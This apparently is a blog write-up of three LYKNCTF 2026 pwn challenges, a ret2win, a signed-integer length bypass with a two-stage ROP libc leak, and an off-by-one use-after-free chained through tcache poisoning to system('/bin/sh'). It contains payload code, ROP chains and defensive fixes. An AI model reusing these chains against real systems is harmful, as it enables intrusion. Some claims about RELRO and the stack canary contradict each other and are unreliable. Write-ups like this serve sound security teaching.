---
title: "LYKNCTF 2026 Pwn Writeup: 3 Binary Exploitation Challenges (ret2win, Signed Length Bypass, Off-by-One UAF Heap)"
slug: "lyknctf-2026-pwn-writeup"
description: "Step-by-step LYKNCTF 2026 pwn (binary exploitation) writeup — three challenges covering a textbook non-PIE ret2win, a signed-int length check that becomes 0xff after byte truncation, and an off-by-one UAF in a note manager chained into heap-safe-linking leak, unsorted-bin libc leak, tcache poisoning, PIE recovery, notes-table hijack for arbitrary read/write, stack ROP, and system('/bin/sh')."
date: 2026-07-11T01:30:00Z
lastmod: 2026-07-11T01:30:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["LYKNCTF 2026"]
tags:
  - "lyknctf"
  - "lyknctf 2026"
  - "pwn"
  - "binary exploitation"
  - "ret2win"
  - "rop chain"
  - "signed integer bug"
  - "byte truncation"
  - "use after free"
  - "tcache poisoning"
  - "safe linking"
  - "unsorted bin libc leak"
  - "notes table hijack"
  - "stack rip overwrite"
keywords:
  - "lyknctf 2026 pwn writeup"
  - "lyknctf pwn writeup"
  - "lyknctf return to lose writeup"
  - "lyknctf ez pwn writeup"
  - "lyknctf h34p d3v1l writeup"
  - "ret2win ctf writeup"
  - "signed to unsigned length bypass ctf"
  - "byte truncation read length ctf"
  - "off by one uaf note manager"
  - "glibc 2.39 safe linking tcache"
  - "unsorted bin main_arena libc leak"
  - "tcache poisoning two entry list"
  - "notes global table overwrite arbitrary read write"
  - "pop rdi ret gadget rop"
  - "system bin sh libc offset"
  - "ctf pwn step by step 2026"
toc: true
cover:
  image: "/images/articles/lyknctf-2026-pwn-writeup.png"
  alt: "LYKNCTF 2026 pwn writeup — three binary exploitation challenges solved covering non-PIE ret2win, signed-integer length bypass with byte truncation, and off-by-one UAF chained into tcache poisoning, arbitrary read/write, and stack RIP overwrite"
---

LYKNCTF 2026's pwn track is short but well-graduated: three challenges that climb from a textbook non-PIE ret2win with no canary, through a signed-integer length check that survives negation and byte truncation before it reaches `read()`, and up to an off-by-one UAF in a note manager that composes into heap-safe-linking leak, unsorted-bin libc leak, glibc 2.39 tcache poisoning, PIE recovery through a stack scan for a `.rodata` string pointer, notes-table hijack for arbitrary read/write, upper-stack dump, saved-RIP identification, and a `system("/bin/sh")` ROP chain, all one binary, one exploit run.

This writeup walks all three pwn solves in the order they appear in the repository: Return-to-Lose (the ret2win), Ez Pwn (signed-int → byte-truncated read length + two-stage ROP), and H34P D3V1L (off-by-one UAF chained end-to-end on Ubuntu glibc 2.39). Handouts, matched libc copies, per-challenge READMEs, and Python exploit scripts live at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF). Every exploit uses only the Python standard library and reproduces the flag against a fresh remote instance.

## The three LYKNCTF 2026 pwn challenges

| # | Challenge | Bug class | Flag |
|---|---|---|---|
| 1 | Return-to-Lose | Textbook ret2win. `read(0, buf, 256)` into `char buf[64]`, non-PIE, no canary, hidden `win()` at `0x4011b6` opens `flag.txt`. Payload `"A"*72 + p64(ret_gadget) + p64(win)`. | `LYKNCTF{6b7e933887794dd28d827ef4b4dd2dd4}` |
| 2 | Ez Pwn | Signed length check: `scanf("%d")` accepts `-1`, `cmp eax, 0x50; jle` treats it as accepted, byte truncation makes it `0xff` for `read(0, buf[0xa0], 255)`. Two-stage ROP: leak `puts` via `puts(puts@got)`, return to `main`, `system("/bin/sh")`. | `LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}` |
| 3 | H34P D3V1L | Note manager off-by-one UAF: `delete_note` leaves stale descriptor when deleting the last entry; `view_note` / `edit_note` accept `idx <= num_notes` instead of `<`. Chain: safe-linking key leak → unsorted-bin libc leak → tcache poison (two-entry list required) → PIE leak → overwrite global `notes` with fake descriptors for arbitrary R/W → stack dump → saved-RIP overwrite with `system("/bin/sh")`. | `LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}` |

The track's design signature is the "decoy handout" pattern: both Return-to-Lose and H34P D3V1L ship a `flag.txt` in the handout archive with a plausible-looking `LYKNCTF{...}` value that is not accepted by the scoreboard. The real flag lives on the remote service, in the file that `win()` opens (Return-to-Lose) or that the shell reads (Ez Pwn, H34P D3V1L). Any solve that skips the remote pop and reads the local file gets a fake flag and thinks the exploit worked. Rule to bake in early: `flag.txt` files bundled with pwn handouts are for validating that the exploit reaches the read primitive, not for submission.

## Methodology — enumerate the mitigations first

A pattern that worked across all three challenges: before touching the disassembly, list the mitigations. For Return-to-Lose that's "non-PIE, no canary, hidden `win()`", and the four properties collectively spell "one-line payload." For Ez Pwn it's "non-PIE with `pop rdi; ret` gadget baked into a labelled `gadget()` function, PIE off means GOT is stable, full RELRO means we cannot rewrite GOT entries", so the intended path is a two-stage classic (libc leak, then `system`). For H34P D3V1L it's "PIE, NX, Full RELRO, canary, glibc 2.39", and every one of those collectively rules out easy wins and forces the full UAF chain. The mitigations are also the shortest description of the intended attack surface: they tell you which primitives you don't get to use.

The second discipline is being explicit about the "decoy handout" trap. Both Return-to-Lose and H34P D3V1L bundle a `flag.txt` in the archive with a fake `LYKNCTF{...}` value. The H34P D3V1L decoy even uses the flavourful string `m0m_s4id_its_my_turn_0n_th3_tc4ch3` which is *exactly* the kind of joke a real challenge author would ship as the real flag. Every solver that reads the local file and submits gets rejected without any signal from the scoreboard about what went wrong. The right treatment is to hardcode "the flag is on the remote service" and use the bundled `flag.txt` only as a local-execution smoke test to confirm the exploit reaches the read primitive.

Per-challenge walkthroughs follow.

## 1. Return-to-Lose

The cleanest ret2win in the track. Non-PIE binary with a hidden `win()` that opens `flag.txt`, no canary, and a 256-byte `read` into a 64-byte buffer.

#### Step 1 — Read the source

The handout ships the C source:

```c
void win(void)
{
    char flag[128];
    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) { write(1, "flag.txt not found on this server.\n", 35); _exit(1); }
    ssize_t n = read(fd, flag, sizeof(flag));
    if (n > 0) write(1, flag, (size_t)n);
    _exit(0);
}

void vuln(void)
{
    char buf[64];
    write(1, "What's your name, traveler?\n> ", 30);
    read(0, buf, 256);
    write(1, "Safe travels!\n", 14);
}
```

`win()` is the target: it opens `flag.txt`, reads up to 128 bytes, writes them to stdout, exits. `vuln()` is the primitive: `char buf[64]` + `read(0, buf, 256)` = 192-byte overflow, no canary in the disassembly.

#### Step 2 — Confirm the mitigations

```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, dynamically linked, ..., not stripped
```

`executable`, not `shared object`: non-PIE. Text addresses are fixed across local and remote runs. Symbols are exported:

```
0x4011b6  T win
0x401246  T vuln
0x401293  T main
```

#### Step 3 — Compute the offset

From `vuln()`'s disassembly:

```asm
0x40124e:  sub rsp, 0x40           ; 64-byte frame
0x401266:  lea rax, [rbp-0x40]     ; buf starts at rbp-0x40
0x40126a:  mov edx, 0x100          ; read length 256
0x401277:  call read
```

Stack at function return:

```
rbp-0x40  buf[64]
rbp+0x00  saved rbp
rbp+0x08  saved rip
```

Offset from buffer start to saved RIP: `64 + 8 = 72` bytes.

#### Step 4 — Fire the payload

Minimal payload would be `b"A"*72 + p64(win)`. In practice, adding a `ret` gadget before `win()` is safer on x86-64 because it restores 16-byte stack alignment before entering a normal prologue (which matters if `win()` ever makes a libc call that assumes aligned `xmm` access). The binary has a `ret` gadget at `0x40101a`:

```python
payload  = b"A" * 72
payload += p64(0x40101a)   # ret; stack alignment
payload += p64(0x4011b6)   # win()
payload += b"\n"
```

When `vuln()` returns:

```
vuln ret → ret gadget → win() → open("flag.txt") → write → _exit(0)
```

Live output:

```
What's your name, traveler?
> Safe travels!
LYKNCTF{6b7e933887794dd28d827ef4b4dd2dd4}
```

Per-challenge README + exploit: [pwn/return-to-lose](https://github.com/Abdelkad3r/LYKNCTF/tree/main/pwn/return-to-lose).

The defensive fix is one line: replace `read(0, buf, 256)` with `read(0, buf, sizeof(buf))`. Stack canary and PIE would add hardening, but the root bug is the oversized read that crosses the frame boundary.

## 2. Ez Pwn

A signed integer bypass that survives two type conversions before reaching `read()`. The intended lesson (per the flag payload's `absolute_femb1` joke) is that "reject negative lengths" is not a substitute for "validate the actual value passed to the syscall."

#### Step 1 — Read the length check

`main()` reserves `0xa0` bytes of stack, then reads an `int` with `scanf("%d", &length)`. The check:

```asm
0x40126a:  mov  eax, DWORD PTR [rbp-0x34]
0x40126d:  cmp  eax, 0x50
0x401270:  jle  0x401286                 ; accepted if length <= 0x50
```

Signed compare (`jle`, not `jbe`). `-1` is treated as less than `0x50` and passes.

#### Step 2 — Watch the byte truncation

After the check, the program moves the length's low byte:

```asm
0x4012a9:  mov  eax, DWORD PTR [rbp-0x34]
0x4012ac:  mov  BYTE PTR [rbp-0x5], al
0x4012af:  movzx edx, BYTE PTR [rbp-0x5]
```

`-1` as a 32-bit int is `0xffffffff`. Its low byte is `0xff`. `movzx edx, byte` zero-extends to `255`. Then:

```asm
0x4012b3:  lea rax, [rbp-0xa0]     ; buf
0x4012ba:  mov rsi, rax
0x4012bd:  mov edi, 0
0x4012c2:  call read@plt
```

`read(0, buf, 255)` on a `0xa0` (160-byte) buffer: 95-byte overflow, comfortably enough to reach saved RIP at `rbp+8`.

Offset from buffer start to saved RIP: `0xa0 + 0x08 = 0xa8 = 168` bytes.

#### Step 3 — Find the gadgets

The binary is non-PIE and ships a labelled `gadget()` function that's basically a gadget library:

```
0x40117a  pop rdi ; ret
0x40117c  pop rsi ; ret
0x40117e  pop rdx ; ret
0x401181  pop rbp ; ret
0x401182  ret               ; plain ret for stack alignment
```

No `win()`. Real ROP chain required. The visible `LYKNCTF{this_is_a_super_fake_flag_for_you}` string in `.rodata` is a decoy; the challenge author is telling you the printed flag on the "fake flag for your effort" path is not the real one.

#### Step 4 — Stage 1: leak libc

The binary imports `puts`, and because the binary is non-PIE and RELRO is not full, the GOT entry is stable. Standard puts-based libc leak:

```python
POP_RDI   = 0x40117a
RET       = 0x401182
PUTS_PLT  = 0x401030
PUTS_GOT  = 0x404000
MAIN      = 0x4011c5

stage1  = b"A" * 168
stage1 += p64(RET)
stage1 += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)
stage1 += p64(RET) + p64(MAIN)
```

The extra `ret` between `puts@plt` and `main` keeps the second pass through `main()` stable. Without it, the process returns to the prompt but dies before the next input round completes.

After sending the payload, the output is noisy because the overflow also smashes local variables that gate the "fake flag" print path (harmless), but immediately after the fake-flag line, `puts(puts@got)` prints the raw resolved `puts` address.

#### Step 5 — Match the remote libc

The remote leaks were compared against local libc copies. The one included in the handout (`artifacts/libc.so.6`) matches `puts`, `read`, and `printf` simultaneously: a triple-verify sanity check to make sure the libc is actually the one loaded remotely. Relevant offsets:

```
puts    = 0x80e50
system  = 0x50d70
"/bin/sh" = 0x1d8678
```

Once the libc base is known:

```python
libc_base = puts_leak - 0x80e50
system    = libc_base + 0x50d70
binsh     = libc_base + 0x1d8678
```

#### Step 6 — Stage 2: system("/bin/sh")

`main()` returns to the same prompt after the first stage. Send `-1` again to get another 255-byte `read`, then a `system("/bin/sh")` chain:

```python
stage2  = b"B" * 168
stage2 += p64(RET)
stage2 += p64(POP_RDI) + p64(binsh) + p64(system)
```

Live shell, then:

```
cat flag.txt; cat /flag.txt; id
LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

Per-challenge README + two-stage exploit + matched libc: [pwn/ez-pwn](https://github.com/Abdelkad3r/LYKNCTF/tree/main/pwn/ez-pwn).

The defensive fix is to validate the length after conversion to the exact type used by `read()`, or better, cap the read with the actual destination buffer size and reject negative values explicitly. The general rule: a mitigation that says "reject values above X" without also saying "reject values below 0" leaves a signed-int bypass alive; a subsequent byte truncation turns that alive bypass into a controllable overflow size.

## 3. H34P D3V1L

The headline pwn of the track. Ubuntu glibc 2.39, PIE + NX + Full RELRO + stack canary, and a note manager whose only bug is an off-by-one index check compounded with stale metadata after deleting the last note. The full chain runs from that single primitive through heap-safe-linking leak, libc leak, tcache poisoning, PIE recovery, notes-table hijack for arbitrary read/write, stack dump, and a `system("/bin/sh")` ROP overwrite of a saved return address.

#### Step 1 — Map the note model

The binary is not stripped, so the interesting functions are named:

```
create_note   view_note   edit_note   delete_note   change_note_size
```

Global note array at PIE offset `0x4060`; global `num_notes` at PIE offset `0x41e0`. Each note is 24 bytes:

```c
struct note {
    int in_use;        // +0x00
    int size;          // +0x04
    int original_idx;  // +0x08
    int padding;       // +0x0c
    char *data;        // +0x10
};
```

Normal `create_note` caps size at `0x100`. `change_note_size` caps at `0x200` (free + malloc + fgets), which is what makes the later stack reads faster.

#### Step 2 — Find the off-by-one UAF

`delete_note` validates indexes strictly: `idx >= 0 && idx < num_notes`. When the deleted note isn't the last entry, it shifts later descriptors down. When the deleted note *is* the last entry, it just decrements `num_notes` and leaves the descriptor untouched; the stale entry still has `in_use = 1`, `size = victim_size`, `data = freed_chunk_ptr`.

`view_note` and `edit_note` validate more loosely: `idx >= 0 && idx <= num_notes`. Note the `<=`. The menu even prints the valid range as `0-(num_notes - 1)`, but the code disagrees.

Simplest UAF shape:

```
create dummy note 0        # keeps num_notes > 0 so view_note doesn't refuse
create victim note 1
delete note 1              # num_notes becomes 1; stale notes[1] still points at freed chunk
view/edit note 1           # off-by-one accepts idx=1 (== num_notes)
```

`view(1)` reads freed heap memory; `edit(1)` writes into freed heap memory.

#### Step 3 — Leak the safe-linking key from tcache

glibc 2.34+ encodes tcache forward pointers with safe-linking: `stored_fd = fd ^ (chunk_addr >> 12)`. For a single freed chunk, `fd = 0`, so the stored value is exactly `chunk_addr >> 12`, the safe-linking key for that chunk.

Free a single tcache chunk through the UAF and `view(1)` prints the key directly. That's the primitive needed to poison the tcache:

```python
encoded = target ^ heap_key
```

#### Step 4 — Leak libc from an unsorted-bin chunk

Fill the tcache bin for a `0x110`-sized chunk (7 entries, tcache max) and free one more chunk of the same size. The extra chunk goes to the unsorted bin, and its `fd`/`bk` pointers point into `main_arena`.

The exploit allocates one dummy + eight `0x100` user chunks, then deletes the eight from end back to front (to preserve the off-by-one UAF pattern), leaving one chunk in unsorted bin:

```python
for i in range(8):
    create(0x100, ...)
for idx in range(8, 0, -1):
    delete(idx)
```

`view(1)` on the stale entry now leaks `main_arena + 0x60`. For the supplied libc, `main_arena + 0x60 = libc_base + 0x203b20`:

```python
libc_base = leak - 0x203b20
```

#### Step 5 — Tcache-poison with a two-entry list

glibc 2.34+ tcache tracks a per-bin count. A one-entry poison is not enough because the first allocation pops the real chunk and decrements the count to zero, at which point the allocator refuses to honour the poisoned head pointer.

Two-entry list workaround. Set up `tcache[size] → B → A` (free two chunks of the same size), then overwrite `B->fd` with the safe-link-encoded target:

```python
poisoned_fd = target ^ (B >> 12)
```

Next two `malloc(size)` calls return `B` and then `target`. `change_note_size` is the right allocator because it supports up to `0x200` bytes, which speeds later stack reads.

One input-layer wrinkle: all writes go through `fgets()`. If an encoded pointer contains byte `0x0a` (newline), `fgets` stops early and leaves bytes queued in stdin. The exploit shifts read targets by 16-byte increments when possible; the one exact `notes`-table overwrite retries on a fresh ASLR layout if the encoded pointer contains a newline.

#### Step 6 — Recover PIE from a stack scan

Tcache poisoning gives one arbitrary allocation, not a reusable arbitrary R/W. The path to reusable R/W is: leak `environ` to get a stack address, then read a small stack window to find a pointer into `.rodata`.

Read `environ` from libc (offset known once libc base is known) to obtain a stack address. Then read a stack window around it. A pointer visible on one successful run:

```
0x58fa8a5a00c4 = PIE base + 0x20c4
```

That offset points at the string `"\n DATA: "` used by `view_note()`. So:

```python
pie_base = leaked_rodata_pointer - 0x20c4
notes    = pie_base + 0x4060
```

#### Step 7 — Hijack the notes table for arbitrary R/W

Tcache-poison an allocation directly onto the global `notes` array. Write a fake table:

```c
notes[0] = { in_use = 1, size = 0x1e0, data = &notes[0] };  // self-pointing
notes[1] = { in_use = 1, size = controlled_size, data = controlled_address };
num_notes = 2;
```

After this:

- `edit(0, ...)` rewrites the fake note table itself (retarget `notes[1]->data` freely).
- `view(1)` = arbitrary read from `controlled_address`.
- `edit(1, ...)` = arbitrary write to `controlled_address`.

The self-pointer on `notes[0]` is what makes the primitive reusable. Instead of burning a fresh tcache poison per read, `notes[0]` retargets `notes[1]` as many times as needed.

#### Step 8 — Dump the stack and find a saved RIP

With arbitrary R/W in place, dump the upper stack:

```python
dump_start = environ - 0x10000
dump_size  = 0x10000
```

Scan for saved return addresses into the PIE `.text` segment. The useful hit on the successful remote run:

```
0x7ffd67440798 -> PIE base + 0x1f2c
```

`0x1f2c` is the return site after one of the main menu handler calls. That slot is reused between menu actions, so overwriting it before a handler returns is a stable redirect.

#### Step 9 — Overwrite saved RIP with a system('/bin/sh') chain

Short ROP chain, straight from the matched libc:

```
ret               = libc_base + 0x2882f
pop rdi ; ret     = libc_base + 0x10f78b
"/bin/sh"         = libc_base + 0x1cb42f
system            = libc_base + 0x58750
```

Write the chain over the saved return slot via `edit(1, ...)`. When the current menu handler returns, control lands on `ret → pop rdi → "/bin/sh" → system`. Shell opens, then:

```
cat flag.txt; cat /flag.txt; id
LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

Per-challenge README + full end-to-end exploit + successful remote run transcript: [pwn/h34p-d3v1l](https://github.com/Abdelkad3r/LYKNCTF/tree/main/pwn/h34p-d3v1l).

## Cross-cutting defender notes

Five patterns recur across the pwn track and translate directly into review heuristics.

**Bundled `flag.txt` files in pwn handouts are decoys.** Both Return-to-Lose (`LYKNCTF{f4k3_f14g}`) and H34P D3V1L (`LYKNCTF{m0m_s4id_its_my_turn_0n_th3_tc4ch3}`) ship a plausible-looking `flag.txt` in the handout that is not accepted by the scoreboard. Read the file for the smoke test that your exploit reaches the `open`/`read` primitive locally, but submit the value the *remote* service prints. This is a general trend in modern pwn CTFs and a common way for solvers to submit fake flags and get puzzled rejections.

**Signed integer length checks must be paired with negativity rejection.** Ez Pwn's `cmp eax, 0x50; jle` accepts `-1` because signed compare says "yes, `-1 <= 0x50`." Any code path that accepts an integer from user input, checks an upper bound, and passes the value to `read`/`memcpy`/`malloc` needs an explicit lower bound too: typically `>= 0` for lengths, or the value should be an `unsigned` type from the start. A subsequent byte truncation turns the signed-int bypass into a controllable overflow size.

**Off-by-one in the wrong direction is easy to miss.** H34P D3V1L's `view_note` and `edit_note` accept `idx <= num_notes`, while the menu prints the valid range as `0-(num_notes - 1)`. The disagreement between the printed range and the actual bounds check is the entire vulnerability. Every "check the index" review needs to compare (1) the strict range the design intends, (2) the message text the user sees, and (3) the actual `<` vs `<=` in the code. If any two of those three disagree, the third is a bug.

**Stale metadata after last-element delete is the sibling bug to off-by-one.** `delete_note` decrements `num_notes` without clearing the last descriptor. That alone isn't exploitable because the strict `< num_notes` check in delete correctly rejects further access. It becomes fatal only when paired with the loose `<= num_notes` check in view/edit. Two small bugs compose into a full UAF; either alone would be a benign quirk. This is a general anti-pattern: when a data structure has multiple entry points that share bounds-check code, any drift between them is a composition vulnerability.

**Modern glibc tcache defences require a two-entry poison.** Safe-linking (glibc 2.32+) encodes forward pointers, so an attacker needs the chunk address to compute the encoding. Per-bin counts (glibc 2.29+) mean a one-entry poison decrements the count to zero and the allocator refuses the poisoned head. Both together mean tcache poisoning requires a leak of at least one chunk address (for safe-linking) and at least two entries in the target bin (so the count reaches 1 after the first pop and 0 after the second, with the second returning the poisoned target). This is a good example of layered mitigations that don't stop the attack but do raise the number of primitives required.

## Frequently asked questions

### What is LYKNCTF 2026?

LYKNCTF 2026 is a CTF whose challenges span multiple categories including web, reverse-engineering (crack), pwn, and forensics. This writeup covers the three pwn (binary exploitation) challenges I solved. Flag prefix `LYKNCTF{...}`. Per-challenge READMEs, handouts, matched libc copies, and Python exploit scripts are mirrored at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF). The companion writeups for the same event's web and crack tracks are at [LYKNCTF web writeup](/ctf-writeups/lyknctf-2026-web-writeup/) and [LYKNCTF crack writeup](/ctf-writeups/lyknctf-2026-crack-writeup/).

### Why is Return-to-Lose the "cleanest ret2win in the track"?

Four mitigations are missing that would each individually block the attack. The binary is non-PIE, so `win()`'s address at `0x4011b6` is fixed and predictable. There is no stack canary, so a straight buffer overflow reaches the saved return address without needing a leak. There is no `sizeof(buf)` bound on the `read`, so 256 bytes go into a 64-byte buffer. And `win()` already does the flag-reading work, so no ROP chain is needed. Payload: `"A"*72 + p64(ret_gadget) + p64(win)`. The `ret` gadget before `win()` is a stack-alignment courtesy that matters if `win()` ever makes libc calls that assume 16-byte alignment.

### How does Ez Pwn's signed integer bug survive to become a controllable overflow?

The length variable is a signed `int`. `scanf("%d", &length)` accepts `-1`. The check is `cmp eax, 0x50; jle`, a signed compare, so `-1 <= 0x50` passes. The program then moves the length's low byte into a `char`: `mov al, ...; mov [rbp-5], al`. For `-1` (`0xffffffff`), the low byte is `0xff`. `movzx edx, byte` zero-extends to 255. That 255 goes to `read(0, buf[0xa0], 255)`, which is a 95-byte overflow that reaches saved RIP at offset 168 (`0xa8 = 0xa0 + 0x08`). Two type conversions (signed-to-signed check, then signed-to-byte truncation) collapse the check into a giveaway.

### Why does Ez Pwn need a two-stage ROP chain?

There's no `win()` function and no direct `system` symbol in the binary. Full RELRO would also block GOT rewriting, but stage 1 doesn't need it: `puts(puts@got)` calls PLT's `puts` with the GOT entry's *address* as argument, and `puts` prints the resolved libc address stored there. Stage 1 also returns to `main` so the read loop runs again for stage 2. Stage 2 computes `libc_base = puts_leak - libc_puts_offset`, then builds `pop rdi; "/bin/sh"; system` and pops a shell.

### What is the "decoy handout flag" trap in pwn CTFs?

Some challenge authors bundle a `flag.txt` file in the handout archive that contains a plausible-looking `LYKNCTF{...}` string, but the scoreboard only accepts the value that the *remote* service prints. In LYKNCTF 2026, Return-to-Lose ships `LYKNCTF{f4k3_f14g}` and H34P D3V1L ships `LYKNCTF{m0m_s4id_its_my_turn_0n_th3_tc4ch3}`. Solvers who run their exploit against the local binary and read the local file get a fake flag and submit it, then get rejected without any diagnostic. The right workflow is to use the local `flag.txt` as a smoke test (does the exploit reach the read primitive?) and submit the value from the remote run.

### What is the off-by-one UAF in H34P D3V1L?

Two small bugs compose. First, `delete_note` decrements `num_notes` and shifts descriptors when the deleted note isn't the last one, but when deleting the last note it decrements `num_notes` and leaves the stale descriptor (with `in_use = 1`, valid size, and a freed `data` pointer) in place. Second, `view_note` and `edit_note` validate `idx >= 0 && idx <= num_notes` instead of `< num_notes`; the menu even prints the valid range as `0-(num_notes-1)` but the code accepts `idx == num_notes`. So `create dummy → create victim → delete victim → view/edit at idx == num_notes` reads or writes freed memory.

### Why does modern glibc tcache poisoning require a two-entry list?

Two mitigations compose. Safe-linking (glibc 2.32+) encodes forward pointers as `stored_fd = next ^ (chunk_addr >> 12)`, so the attacker needs the chunk address to build a valid encoded pointer. Per-bin counts (glibc 2.29+) mean the allocator tracks how many chunks are in each tcache bin; a `malloc(size)` pops the head and decrements the count. If the count reaches zero, subsequent `malloc(size)` requests go to the general allocator instead of the tcache. A one-entry poison decrements the count to zero on the first pop, and the poisoned target is never returned. A two-entry list (`tcache[size] → B → A`, with `B->fd` overwritten to the poisoned target) makes the first `malloc` return `B` (count goes 2→1) and the second `malloc` return the poisoned target (count goes 1→0). Same chunk-address leak requirement, but the count reaches zero *after* the poisoned target is popped.

### How does H34P D3V1L go from tcache poisoning to reusable arbitrary read/write?

Tcache poisoning alone gives a one-shot arbitrary allocation, not a reusable primitive. The exploit turns it into one by tcache-poisoning an allocation directly onto the global `notes` array, then writing a fake table with `notes[0] = {in_use=1, size=0x1e0, data=&notes[0]}` (self-pointing) and `notes[1] = {in_use=1, size=<controlled>, data=<controlled>}`. After that, `edit(0)` rewrites the fake table itself (retarget `notes[1]->data` freely), `view(1)` reads from `notes[1]->data`, and `edit(1)` writes to `notes[1]->data`. `notes[0]` retargets `notes[1]` as many times as needed, so a single tcache poison enables unlimited arbitrary reads and writes.

### Why overwrite a saved return address instead of `__free_hook` or GOT?

Full RELRO is enabled on H34P D3V1L, so the GOT is mapped read-only and cannot be rewritten. `__free_hook` and `__malloc_hook` exist as compatibility symbols in glibc 2.39, but they aren't consulted by the allocator any more; the hooks were removed as active control-flow targets in glibc 2.34. The stack, however, is writable, and dumping the upper stack via the arbitrary R/W primitive reveals saved return addresses into the PIE `.text` segment. Overwriting one of those with a `system("/bin/sh")` ROP chain fires when the enclosing function returns. This is the modern replacement for the pre-2.34 `__free_hook` / `__malloc_hook` overwrite patterns.

### What's the broader lesson from the LYKNCTF 2026 pwn track?

The three challenges climb through a well-designed difficulty curve: (1) miss `sizeof(buf)` and lose to a ret2win; (2) accept a signed length and lose to byte truncation; (3) let two small index-check drifts compose into a full off-by-one UAF that unwinds through every layer of modern glibc heap defence. The general defensive lesson is that mitigations rarely fail in isolation; they compose or fail to compose against layered attacks. Full RELRO alone doesn't stop the H34P D3V1L exploit because the arbitrary R/W primitive redirects to the stack. Stack canary alone would stop it, though (the saved-RIP overwrite would trigger the canary check). Layered defence is the right posture, and every review needs to check what happens when one layer is bypassed.

### Where can I find the exploit scripts?

Per-challenge READMEs, handouts, matched libc copies, and Python exploit scripts are at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF). Each pwn challenge has a `solve.sh` wrapper and an `exploit.py` that reproduces the flag against a fresh remote instance. All three exploits use only the Python standard library (no `pwntools` dependency). H34P D3V1L is ASLR-sensitive only in the sense that a few `fgets`-based writes retry on a fresh layout if an encoded pointer contains a newline byte.

## Closing notes

Three pwn challenges, three well-graduated primitives. Return-to-Lose covers the base case (no PIE + no canary + hidden win), Ez Pwn covers the "type-conversion length bug" family (signed check → byte truncation → controlled overflow size + libc-leak-and-return-to-main two-stage ROP), and H34P D3V1L covers the full modern-glibc chain (safe-linking key leak → unsorted-bin libc leak → two-entry tcache poison → PIE recovery via stack scan → global-table hijack for reusable arbitrary R/W → saved-RIP overwrite → `system("/bin/sh")`). The track's design signature is the "decoy handout flag" pattern: don't submit the local `flag.txt`, always pop the remote.

For more binary exploitation on this site, the [TraceBash CTF 2026 pwn writeup](/ctf-writeups/tracebash-ctf-2026-pwn-writeup/) covers Banned Bytes (badchars-clean ROP with PTY literal-next quoting) and Legacy Ledger (format-string `%hn` to stack shellcode). The [SEKAI CTF 2026 master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) walks the `ppp` challenge, which turns an AFC heap overflow into tcache poisoning that overwrites `puts@GOT` with `system` (matched pattern to H34P D3V1L's UAF-to-ROP). The [RIFFHACK 2026 master writeup](/ctf-writeups/riffhack-2026-writeup/) has the escrow-terminal format-string primitive. The paired [LYKNCTF web writeup](/ctf-writeups/lyknctf-2026-web-writeup/) and [LYKNCTF crack writeup](/ctf-writeups/lyknctf-2026-crack-writeup/) cover the same event's other tracks. Full [CTF writeups index](/ctf-writeups/) for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is LYKNCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "LYKNCTF 2026 is a CTF whose challenges span multiple categories including web, reverse-engineering (crack), pwn, and forensics. This writeup covers the three pwn challenges I solved. Flag prefix LYKNCTF{...}. Per-challenge READMEs, handouts, matched libc copies, and Python exploit scripts are mirrored at github.com/Abdelkad3r/LYKNCTF."}},
    {"@type": "Question","name": "Why is Return-to-Lose the cleanest ret2win in the track?","acceptedAnswer": {"@type": "Answer","text": "Four mitigations are missing: non-PIE (win()'s address is fixed at 0x4011b6), no stack canary, no sizeof(buf) bound on the read, and win() already opens flag.txt. Payload: 'A'*72 + p64(ret_gadget) + p64(win). The ret gadget is stack-alignment courtesy."}},
    {"@type": "Question","name": "How does Ez Pwn's signed integer bug survive to become a controllable overflow?","acceptedAnswer": {"@type": "Answer","text": "scanf(%d) accepts -1. cmp eax, 0x50; jle is signed compare, so -1 <= 0x50 passes. The low byte is then moved into a char (0xff for -1). movzx zero-extends to 255. read(0, buf[0xa0], 255) is a 95-byte overflow reaching saved RIP at offset 168."}},
    {"@type": "Question","name": "Why does Ez Pwn need a two-stage ROP chain?","acceptedAnswer": {"@type": "Answer","text": "No win() and no direct system symbol. Stage 1: puts(puts@got) leaks libc, then return to main. Stage 2: compute libc base, build pop rdi; '/bin/sh'; system chain, pop a shell."}},
    {"@type": "Question","name": "What is the decoy handout flag trap in pwn CTFs?","acceptedAnswer": {"@type": "Answer","text": "Some challenge authors bundle a flag.txt in the handout with a plausible LYKNCTF{...} string not accepted by the scoreboard. LYKNCTF's Return-to-Lose ships LYKNCTF{f4k3_f14g} and H34P D3V1L ships LYKNCTF{m0m_s4id_its_my_turn_0n_th3_tc4ch3}. Use the local file for smoke tests; submit the remote value."}},
    {"@type": "Question","name": "What is the off-by-one UAF in H34P D3V1L?","acceptedAnswer": {"@type": "Answer","text": "delete_note decrements num_notes but leaves the stale descriptor when deleting the last note. view_note and edit_note accept idx <= num_notes instead of < num_notes. Compose: create dummy → create victim → delete victim → view/edit at idx == num_notes reads/writes freed memory."}},
    {"@type": "Question","name": "Why does modern glibc tcache poisoning require a two-entry list?","acceptedAnswer": {"@type": "Answer","text": "Safe-linking (2.32+) encodes fd = next ^ (chunk >> 12), so attacker needs chunk-address leak. Per-bin counts (2.29+) mean a one-entry poison decrements count to zero on first pop and allocator refuses subsequent requests. Two-entry list (tcache[size] → B → A) with B->fd overwritten: first malloc returns B (count 2→1), second malloc returns poisoned target (count 1→0)."}},
